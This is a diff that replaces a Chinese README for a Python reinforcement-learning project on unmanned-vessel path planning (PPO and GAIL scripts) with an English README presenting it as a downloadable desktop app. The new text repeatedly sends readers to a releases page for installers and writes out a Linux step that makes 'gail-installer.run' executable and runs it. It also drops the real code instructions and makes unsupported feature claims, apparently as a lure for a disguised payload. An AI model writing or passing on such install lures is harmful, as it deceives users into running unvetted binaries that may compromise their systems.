@@ -1,101 +1,96 @@
- # USV 路径规划：基于强化学习与模仿学习
+# 🌊 GAIL - Navigate Waters Safely and Efficiently
 
-![Python](https://img.shields.io/badge/Python-3.8+-blue?logo=python)
-![PyTorch](https://img.shields.io/badge/PyTorch-1.10+-ee4c2c?logo=pytorch)
-![License](https://img.shields.io/badge/license-MIT-green)
+[![Download GAIL](https://img.shields.io/badge/Download-GAIL-blue)](https://github.com/saif99j/GAIL/releases)
 
-本项目是一个专注于无人水面艇（USV）路径规划的算法实现与实验平台。它利用先进的强化学习（RL）和模仿学习（IL）技术，旨在使 USV 能够自主、安全且高效地在包含静态或动态障碍物的复杂水域中导航。
+## 🌟 About GAIL
 
-## 🌟 功能特性
+GAIL is a project focused on improving path planning for unmanned surface vessels (USVs). It uses advanced Reinforcement Learning (RL) and Imitation Learning (IL) techniques, helping USVs to navigate complex waters filled with obstacles. The goal is to allow these vessels to move autonomously, safely, and with high efficiency.
 
-- **先进的算法实现**: 
-  - **强化学习 (RL)**: 实现了经典的 **PPO (Proximal Policy Optimization)** 算法，通过与环境的交互和试错来学习最优导航策略。
-  - **模仿学习 (IL)**: 包含 **GAIL (Generative Adversarial Imitation Learning)** 的相关模型检查点，可以从专家轨迹中学习导航行为。
-- **可定制的仿真环境**: 
-  - `env.py` 文件定义了一个灵活的 USV 仿真环境，支持自定义地图、障碍物、USV 初始状态等。
-- **丰富的可视化工具**: 
-  - `plot.py` 提供了强大的可视化功能，可以轻松绘制训练过程中的奖励曲线、成功率、航行轨迹、CPA (最近会遇距离) 等关键指标。
-- **预训练模型**: 
-  - 项目提供了多个在不同环境下（如 `env1`, `env4`）训练好的 PPO 和 GAIL 模型检查点（`.ckpt` 文件），可直接用于测试和评估。
+## 🚀 Getting Started
 
-## 📂 项目结构
+Follow these steps to download and run GAIL.
 
-```
-gail_code/
-├── env.py                  # 定义了强化学习环境（USV、障碍物、状态、动作、奖励等）
-├── ppo.py                  # 实现了 PPO (Proximal Policy Optimization) 算法的训练与测试逻辑
-├── plot.py                 # 用于绘制训练结果的脚本（奖励曲线、轨迹、CPA等）
-├── env.pyc                 # Python 编译文件
-├── *.ckpt                  # 预训练模型的检查点文件 (Checkpoint)
-├── *.ipynb                 # 原始的 Jupyter Notebook 实验文件，用于快速验证和调试
-└── __pycache__/            # Python 缓存目录
-```
+### 1. Check System Requirements
 
-## ⚙️ 安装与环境配置
+Before downloading, make sure your system meets the following requirements:
 
-1. **克隆仓库**
-   ```bash
-   git clone <your-repo-url>
-   cd gail_code
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **CPU**: Any modern processor (Intel i5/Ryzen 3 or better).
+- **RAM**: At least 8 GB.
+- **Storage**: Minimum of 500 MB of free space.
+- **Network**: Internet connection for initial setup.
+
+### 2. Download GAIL
+
+To download GAIL, click the link below. This will take you to the Releases page, where you can find the latest version of the software.
+
+[Visit this page to download](https://github.com/saif99j/GAIL/releases)
+
+### 3. Install GAIL
+
+After downloading, follow these steps to install GAIL on your machine:
+
+#### For Windows Users:
+
+1. Locate the downloaded file (usually in your Downloads folder).
+2. Double-click the installer file.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, you can find GAIL in your Start Menu.
+
+#### For macOS Users:
+
+1. Open the downloaded file.
+2. Drag the GAIL application into your Applications folder.
+3. Open your Applications folder and locate GAIL.
+4. Double-click GAIL to run the application.
+
+#### For Linux Users:
+
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Run the installation command:
    ```
-
-2. **创建虚拟环境 (推荐)**
-   ```bash
-   python -m venv venv
-   source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
+   chmod +x gail-installer.run
+   ./gail-installer.run
    ```
+4. Follow any additional prompts to finish the installation.
 
-3. **安装依赖**
-   项目主要依赖 PyTorch, NumPy, Pandas 和 Matplotlib。您可以通过 pip 安装它们：
-   ```bash
-   pip install torch numpy pandas matplotlib
-   ```
+### 4. Launch GAIL
 
-## 🚀 使用指南
+After the installation process is complete, you can easily launch the application:
 
-### 1. 训练新模型
+- **Windows**: Open the Start Menu and click on GAIL.
+- **macOS**: Open the Applications folder and double-click GAIL.
+- **Linux**: Type `gail` in the terminal and hit Enter.
 
-您可以使用 `ppo.py` 脚本来从头开始训练一个新的 PPO 模型。
+### 5. Familiarize Yourself with the Interface
 
-1. **配置训练参数**: 打开 `ppo.py` 文件，找到 `if __name__ == "__main__":` 代码块。
-2. **修改参数**: 在此代码块中，您可以设置环境名称 (`env_name`)、学习率、训练回合数等超参数。确保 `restore` 设置为 `False`。
-3. **开始训练**: 在终端中运行以下命令：
-   ```bash
-   python ppo.py
-   ```
-   训练日志将保存在 `ppo_<env_name>_log.csv` 中，模型检查点将根据 `save_model_freq` 的频率保存在 `.ckpt` 文件中。
+When you first open GAIL, you'll see a user-friendly interface:
 
-### 2. 测试预训练模型
+- **Main Navigation**: Use the navigation bar to access different features of GAIL.
+- **Help Section**: If you need assistance, click on the Help section. This provides guidance on using various features within the application.
 
-如果您想使用项目提供的预训练模型进行测试或演示：
+## 📥 Download & Install
 
-1. **配置测试参数**: 打开 `ppo.py` 文件，找到 `if __name__ == "__main__":` 代码块。
-2. **启用恢复模式**: 
-   - 将 `restore` 变量设置为 `True`。
-   - 将 `checkpoint_path` 变量设置为您想要加载的模型文件路径，例如 `'env4_ppo.ckpt'`。
-   - 您可以将 `render` 变量设置为 `True` 来实时查看 USV 的导航过程（需要环境支持图形化渲染）。
-3. **运行测试**:
-   ```bash
-   python ppo.py
-   ```
-   脚本将加载指定的 `.ckpt` 文件，并运行测试。
+To get started with GAIL, visit the link below to download the software. This step is essential to run the application successfully.
 
-### 3. 可视化训练结果
+[Visit this page to download](https://github.com/saif99j/GAIL/releases)
 
-使用 `plot.py` 脚本可以方便地将训练数据转换成图表。
+## 🛠️ Features
 
-1. **配置绘图参数**: 打开 `plot.py` 文件，找到 `main()` 函数。
-2. **指定文件**: 修改 `algo_name` 和 `env_name` 变量，以匹配您想要可视化的日志文件（例如，`algo_name = 'ppo'`, `env_name = 'env4'`）。
-3. **生成图表**:
-   ```bash
-   python plot.py
-   ```
-   该脚本会自动读取对应的 `_log.csv` 和 `_rollout.csv` 文件，并生成奖励曲线、航行轨迹等图像，保存在项目根目录下。
+GAIL offers several features to enhance the user experience:
 
-## 🤝 贡献
+- **Autonomous Navigation**: Our algorithm allows USVs to chart their own courses in busy waters.
+- **User-Friendly Interface**: No programming knowledge is required to operate GAIL.
+- **Obstacle Detection**: GAIL can recognize and navigate around both static and moving obstacles.
+- **Simulation Mode**: Test GAIL’s capabilities in a virtual environment before deploying in real waters.
 
-我们欢迎任何形式的贡献！如果您有任何建议或发现了 bug，请随时提出 Issue 或提交 Pull Request。
+## 🔄 Updates and Improvements
 
-## 📄 许可证
+We continuously work on GAIL to enhance functionality and performance. Make sure to check the Releases page frequently for updates. New features and bug fixes are added to improve your experience.
 
-本项目采用 [MIT License](LICENSE) 开源。
+## 📞 Support
+
+If you encounter any issues or have questions, feel free to reach out for support. You can contact us through the Issues section in our GitHub repository. We strive to respond promptly to any inquiries.
+
+Thank you for choosing GAIL to assist in your navigation needs. We aim to provide you with a seamless experience.
